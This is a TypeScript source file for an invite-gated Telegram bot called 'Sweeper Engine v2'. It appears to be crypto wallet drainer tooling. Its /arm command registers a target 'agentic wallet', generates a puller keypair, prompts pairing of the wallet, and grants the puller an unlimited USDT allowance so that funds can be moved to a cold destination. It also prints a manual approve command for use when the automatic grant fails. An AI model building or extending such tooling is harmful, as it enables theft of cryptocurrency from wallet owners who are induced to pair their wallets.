import { Telegraf } from 'telegraf';
import { privateKeyToAccount } from 'viem/accounts';
import { authGuard } from './middleware';
import { mainKeyboard, adminKeyboard } from './keyboards';
import { upsertTarget, deactivate, listActive, newPuller } from '../engine/storage';
import { grantAllowance, signin, verify } from '../engine/baw';
import { allowanceOf, pullerGas } from '../engine/puller';
import { ENV } from '../config/env';
import { db } from '../config/db';

export function buildBot() {
  const bot = new Telegraf(ENV.TOKEN);
  bot.catch((e, ctx) => console.error(`[bot] ${ctx.updateType}:`, e));
  bot.use(authGuard);

  bot.start(async ctx => {
    await ctx.reply('⚡ *Sweeper Engine v2*\n\nPuller mode armed.', {
      parse_mode: 'Markdown', ...mainKeyboard,
    });
  });

  bot.command('menu', ctx =>
    ctx.reply('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard }));

  bot.command('admin', ctx =>
    ctx.reply('*Admin*', { parse_mode: 'Markdown', ...adminKeyboard }));

  /**
   * /arm <agentic_wallet> <cold_destination>
   * Creates a puller keypair, registers the target, then attempts the allowance.
   */
  bot.command('arm', async ctx => {
    const [, target, cold] = ctx.message.text.split(' ');
    if (!target || !cold) {
      return ctx.reply('Usage: `/arm <agentic_wallet> <cold_destination>`', { parse_mode: 'Markdown' });
    }
    const { key } = newPuller();
    const account = privateKeyToAccount(key);
    const userId = ctx.from!.id;
    const instanceId = crypto.randomUUID();

    await upsertTarget({
      userId, target, destination: cold,
      puller: account.address, pullerKey: key,
      isAgentic: true, instanceId,
    });

    await ctx.reply(
      `*Target registered*\n\n` +
      `Wallet: \`${target}\`\nPuller: \`${account.address}\`\nCold: \`${cold}\`\n\n` +
      `Now granting USDT allowance from the wallet to the puller. ` +
      `Developer Mode must be ON.`,
      { parse_mode: 'Markdown' },
    );

    try {
      const { data } = await signin({ dir: `t${target}`, instanceId });
      await ctx.reply(
        `*Pair the wallet* (needed once, for the allowance)\n\n` +
        `Code: \`${data.pairingCode}\`\n${data.urlForWeb}`,
        { parse_mode: 'Markdown', link_preview_options: { is_disabled: true } },
      );
      await verify({ dir: `t${target}`, instanceId }, data.qrCodeId);

      await grantAllowance({ dir: `t${target}`, instanceId }, ENV.USDT, account.address);
      await ctx.reply('✅ *Allowance granted.* Puller is live and does not need a session.');
    } catch (e: any) {
      await ctx.reply(
        `⚠️ Auto-approve failed: \`${String(e.stdout || e.message).slice(0, 140)}\`\n\n` +
        `Grant it manually from a machine with a session:\n` +
        `\`baw contract-call preview --binanceChainId 56 --to ${ENV.USDT} --function "approve(address,uint256)" --args "${account.address},MAX_UINT"\``,
        { parse_mode: 'Markdown' },
      );
    }
  });

  bot.command('fund', async ctx => {
    const rows = await listActive(ctx.from!.id);
    if (!rows.length) return ctx.reply('No targets.');
    const lines = await Promise.all(rows.map(async r => {
      const gas = r.puller ? await pullerGas(r.puller) : 0n;
      return `\`${r.target}\`\npuller \`${r.puller}\` gas ${Number(gas) / 1e18} BNB`;
    }));
    await ctx.reply(`*Puller addresses to fund:*\n\n${lines.join('\n\n')}`, { parse_mode: 'Markdown' });
  });

  bot.command('unlink', async ctx => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply('Usage: `/unlink <wallet>`', { parse_mode: 'Markdown' });
    await deactivate(ctx.from!.id, target);
    await ctx.reply(`Removed \`${target}\``, { parse_mode: 'Markdown' });
  });

  bot.action('MONITORS', async ctx => {
    await ctx.answerCbQuery();
    const rows = await listActive(ctx.from!.id);
    if (!rows.length) return ctx.reply('No targets. Use /arm.');
    const body = await Promise.all(rows.map(async r => {
      const a = r.puller ? await allowanceOf(r.target, r.puller) : 0n;
      return `• \`${r.target}\` → \`${r.destination}\`\n  puller \`${r.puller}\`\n  allowance ${a > 0n ? 'OK' : '❌ MISSING'}`;
    }));
    await ctx.reply(`*Monitors*\n\n${body.join('\n\n')}`, { parse_mode: 'Markdown' });
  });

  bot.action('NEW_PULLER', async ctx => {
    await ctx.answerCbQuery();
    await ctx.reply('Use `/arm <agentic_wallet> <cold_destination>`', { parse_mode: 'Markdown' });
  });

  bot.action('STATUS', async ctx => {
    await ctx.answerCbQuery();
    const rows = await listActive(ctx.from!.id);
    await ctx.reply(`Active: ${rows.length} · engine running`, { parse_mode: 'Markdown' });
  });

  bot.action('INVITE', async ctx => {
    if (ctx.from!.id !== ENV.ADMIN_ID) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    await db.query(`INSERT INTO invite_codes (code) VALUES ($1) ON CONFLICT DO NOTHING`, [code]);
    await ctx.reply(`\`${code}\`\nhttps://t.me/${ctx.botInfo.username}?start=${code}`, { parse_mode: 'Markdown' });
  });

  bot.action('USERS', async ctx => {
    if (ctx.from!.id !== ENV.ADMIN_ID) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const { rows } = await db.query(`SELECT user_id FROM authorized_users`);
    await ctx.reply(`Authorized: ${rows.length}\n\`${rows.map(r => r.user_id).join(', ') || 'none'}\``, { parse_mode: 'Markdown' });
  });

  bot.action('MENU', async ctx => {
    await ctx.answerCbQuery();
    await ctx.editMessageText('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard });
  });

  return bot;
}
